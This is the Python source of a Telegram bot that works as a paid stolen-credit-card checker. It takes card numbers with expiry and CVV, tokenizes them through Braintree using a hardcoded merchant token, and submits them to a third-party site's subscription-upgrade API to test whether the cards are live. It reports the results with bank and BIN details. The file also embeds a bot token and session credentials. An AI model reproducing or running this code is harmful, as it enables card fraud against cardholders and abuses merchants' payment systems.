import requests
import telebot
import time
from user_agent import generate_user_agent

user_agent = generate_user_agent()

bot = telebot.TeleBot('7323465079:AAEzXRyWhCJ4x6VrEdIcMIRt7Rvg93QxXw0')

authorized_user_ids = [7168909426, 1279901274]
authorized_chat_ids = [7168909426, -1001701395932, -1001973816710, -1001933244351]#, -1001933244351

last_auth_time = {}
auth_count = {}


@bot.message_handler(commands=['chk'])
def authorize_card(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if user_id in authorized_user_ids or chat_id in authorized_chat_ids:
        if user_id not in auth_count:
            auth_count[user_id] = 0

        current_time = time.time()

        if current_time - last_auth_time.get(user_id, 0) < 50:
            wait_time = 50 - (current_time - last_auth_time[user_id])
            bot.reply_to(message, f"ANTI_SPAM: Try again after {int(wait_time)} seconds.")
            return

        auth_count[user_id] += 1
        last_auth_time[user_id] = current_time

    if user_id not in authorized_user_ids and chat_id not in authorized_chat_ids:
        bot.reply_to(message, "PREMIUM 15$ CHECKE MY CHAT [ @beson_sk ]")
        return

    command = message.text
    if len(command.split('|')) != 4:
        bot.reply_to(message, "Invalid command format. Please use the format: /chk XXXXXXXXXXXXXXXX|Month|Year|CVV")
        return

    result = verify_card(message, command)
    bot.reply_to(message, result)


def verify_card(message, command):
    P = command.split(' ')[1]
    n = P.split('|')[0]
    mm = P.split('|')[1]
    yy = P.split('|')[2][-2:]
    cvc = P.split('|')[3].replace('\n', '')
    P = P.replace('\n', '')

    auth_message = bot.send_message(message.chat.id, text='**Please Wait ...**', parse_mode='markdown', reply_to_message_id=message.message_id)
    time.sleep(5)
    start_time = time.time()
    
  
    headers_1 = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTQ2MDUwNzAsImp0aSI6ImI1NGEyNWYyLWZjNTktNGI0Ni04ZjZkLTBmOTQwYWE3NjgyYyIsInN1YiI6InByOGtjMjZ0dGdzN21rc3kiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InByOGtjMjZ0dGdzN21rc3kiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.PlfRyXAFroeBnqIc4DXOAW5r8Xk_XZOugdlpdEfmF_sEJU6JlCEauQvu0rZkCJaeb3DHZ19m25WICIJ9EUU5Tg',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': generate_user_agent(),
    }

    json_data_1 = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': '14b19c1b-3926-4aee-82e4-75f2b58fbe2a',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
    }

    response_1 = requests.post('https://payments.braintree-api.com/graphql', headers=headers_1, json=json_data_1)



    id = response_1.json()['data']['tokenizeCreditCard']['token']

    auth_message = bot.edit_message_text(chat_id=message.chat.id, message_id=auth_message.message_id, text='**Waiting for result...**', parse_mode='markdown')

    cookies = {
    '_ga': 'GA1.2.1808642279.1692732252',
    '_fbp': 'fb.1.1692732252369.193149443',
    '_gid': 'GA1.2.1634295707.1694517718',
    '_ga_C79D1G78LE': 'GS1.2.1694517718.7.0.1694517718.60.0.0',
    '_ga_MKJ77D5EMY': 'GS1.2.1694517719.7.1.1694518661.60.0.0',
    }

    headers_2 = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
    'Authorization': 'JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjY1MDA0ZDQxM2Y2N2Q2MzAyMzQzNDczMCIsImV4cCI6MTcyNTYyMjU5NDIxOH0.6gcjBwUEH9VhkjxDj11MDso3oecnDtDdFtKmd9QLy0E',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    # 'Cookie': '_ga=GA1.2.1808642279.1692732252; _fbp=fb.1.1692732252369.193149443; _gid=GA1.2.1634295707.1694517718; _ga_C79D1G78LE=GS1.2.1694517718.7.0.1694517718.60.0.0; _ga_MKJ77D5EMY=GS1.2.1694517719.7.1.1694518661.60.0.0',
    'Origin': 'https://island.octalysisprime.com',
    'Referer': 'https://island.octalysisprime.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': generate_user_agent(),
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

    json_data_2 = {
    'nonce': id,
    'subscriptionPeriod': 'b',
    }

    response_2 = requests.post(
    'https://island.octalysisprime.com/api/subscription/upgrade-account',
    cookies=cookies,
    headers=headers_2,
    json=json_data_2,
    )


    time.sleep(4)

    api = requests.get(f'https://lookup.binlist.net/{n[:6]}').json()
    try:
        chh = api['scheme']
        ch = chh.upper()
    except:
        ch = 'False'
    try:
        typ = api['type']
        type = typ.upper()
    except:
        type = 'False'
    try:
        raa = api['brand']
        ra = raa.upper()
    except:
        ra = 'False'
    try:
        am = api['bank']['name']
        ame = am.upper()
    except:
        ame = 'False'
    try:
        co = api['country']['name']
        cou = co
    except:
        cou = 'False'
    try:
        emoji = api['country']['emoji']
    except:
        emoji = 'False'
        
    end_time = time.time()
    elapsed_time = round(end_time - start_time, 2)

    bot.delete_message(chat_id=message.chat.id, message_id=auth_message.message_id)

    if response_2.status_code == 200:
        data = response_2.json()
        #message = data["resultSub"]["message"]
        #status = data["resultSub"]["transaction"]["status"]
        status = data["status"]

        if "Insufficient Funds" in data or "success" in data or "Funds" in data:
            return f'''Approved ✅\n
ϟ Card -» {P}
ϟ Gateway -» Braintree Auth3
ϟ Response -» {status}
ϟ Status -»  Approved! ♻️
ϟ Result -» Charged 0.01$
————Bank Details————                
ϟ Bin -» {n[:6]}
ϟ Bin Info -» {ch} - {type} - {ra}
ϟ Bank -» {ame}
ϟ Country -» {cou} {emoji}
————Other Details————
ϟ Tries -» 1
ϟ Proxy -» Live! [ 413.02.4.. ✅ ] 
ϟ Dev -» BESON|DOON [ @x6f_0 | @Doon090 ]
ϟ Taken {elapsed_time} seconds .
'''

        
            print(f'''Approved ✅\n
ϟ Card -» {P}
ϟ Gateway -» Braintree Auth3
ϟ Response -» {status}
ϟ Status -»  Approved! ♻️
ϟ Result -» Charged 0.01$
————Bank Details————                
ϟ Bin -» {n[:6]}
ϟ Bin Info -» {ch} - {type} - {ra}
ϟ Bank -» {ame}
ϟ Country -» {cou} {emoji}
————Other Details————
ϟ Tries -» 1
ϟ Proxy -» Live! [ 413.02.4.. ✅ ] 
ϟ Dev -» BESON|DOON [ @x6f_0 | @Doon090 ]
ϟ Taken {elapsed_time} seconds .
''')


        elif "Gateway Rejected: risk_threshold" in data:
            return f'''- - - - - - - - - - - - - - - - - - - - - - -
RISK: Retry this BIN later.
- - - - - - - - - - - - - - - - - - - - - - -
'''

             
        
        else:
            return f'''Declined ❌
- - - - - - - - - - - - - - - - - - - - - - -
ϟ Card -» {P}
ϟ Gateway -> Braintree Auth3
ϟ Response -» {status}
ϟ Status -» 201:Declined
ϟ Result -» Not Charged
————Bank Details————                
ϟ Bin -» {n[:6]}
ϟ Bin Info -» {ch} - {type} - {ra}
ϟ Bank -» {ame}
ϟ Country -» {cou} {emoji}
————Other Details————
ϟ Tries -» 1
ϟ Proxy -» Live! [ 413.02.49.. ✅ ] 
ϟ Dev -» BESON|DOON [ @x6f_0 | @Doon090 ]
ϟ Taken {elapsed_time} seconds .
'''





        
    else:
        return f'''Declined ❌
- - - - - - - - - - - - - - - - - - - - - - -
CC -> {P}
Gateway -> Braintree Charge
Response -> UNKNOW ReSpOnSe !
Message -> UNKNOW Error .
- - - - - - - - - - - - - - - - - - - - - - -
Bin -> {n[:6]}
Bin Info -> {ch} - {type} - {ra}
Bank -> {ame}
Country -> {cou} {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
ϟ Dev -» BESON|DOON [ @x6f_0 | @Doon090 ]
Taken {elapsed_time} seconds .
'''


bot.polling()
